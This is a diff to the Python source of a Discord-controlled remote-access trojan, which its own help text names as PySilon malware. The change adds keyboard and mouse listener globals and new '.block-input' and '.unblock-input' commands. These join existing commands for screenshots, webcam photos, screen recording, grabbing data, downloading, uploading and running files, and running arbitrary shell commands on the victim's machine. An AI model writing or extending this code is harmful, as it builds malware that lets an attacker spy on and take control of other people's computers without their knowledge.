@@ -225,7 +225,7 @@ async def on_raw_reaction_remove(payload):
 
 @client.event
 async def on_message(message):
-    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages
+    global channel_ids, vc, working_directory, tree_messages, messages_from_sending_big_file, files_to_merge, expectation, one_file_attachment_message, processes_messages, processes_list, process_to_kill, cookies_thread, implode_confirmation, cmd_messages, keyboard_listener, mouse_listener
     if message.author != client.user:
         if message.channel.id in channel_ids.values():
             if message.content == '.implode':
@@ -242,7 +242,7 @@ async def on_message(message):
             elif message.content[:5] == '.help':
                 await message.delete()
                 if message.content.strip() == '.help':
-                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.screenrec\n.cmd [command]\n.cd [dir]\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
+                    reaction_msg = await message.channel.send('```List of all commands:\n.ss\n.join\n.show [what-to-show]\n.kill [process-id]\n.grab [what-to-grab]\n.clear\n.pwd\n.tree\n.ls\n.download [file-or-dir]\n.upload [type] [name]\n.execute [file]\n.remove [file-or-dir]\n.implode\n.webcam photo\n.screenrec\n.block-input\n.unblock-input\n.cmd [command]\n.cd [dir]\nDetailed List here: https://github.com/mategol/PySilon-malware/wiki/Commands```'); await reaction_msg.add_reaction('🔴')
             
             elif expectation == 'key':
                 try:
